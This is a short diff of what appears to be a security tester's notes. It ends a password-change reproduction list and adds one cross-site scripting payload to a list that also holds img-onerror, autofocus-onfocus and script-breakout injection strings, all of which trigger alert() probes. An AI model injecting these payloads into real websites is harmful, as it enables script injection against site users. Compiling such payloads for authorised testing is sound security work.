@@ -10,7 +10,7 @@ Steps to repro:
 5) Password will be changed.
 
 XSS/
-
+<%0dsvg/onload=alert(1337)>
 "><img src onerror=alert(1)>
 "autofocus onfocus=alert(1)//
 </script><script>alert(1)</script>
